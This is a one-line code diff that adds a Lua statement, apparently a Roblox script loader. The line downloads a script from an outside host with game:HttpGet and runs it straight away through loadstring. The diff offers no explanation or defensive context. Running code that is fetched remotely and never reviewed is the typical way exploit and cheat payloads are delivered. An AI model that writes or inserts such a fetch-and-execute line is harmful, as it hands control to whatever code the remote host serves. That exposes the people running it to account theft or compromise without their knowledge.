@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.valincsyndicate.com/v1/releases/829f08e6f1232f0110935ad3115bf854.lua"))()
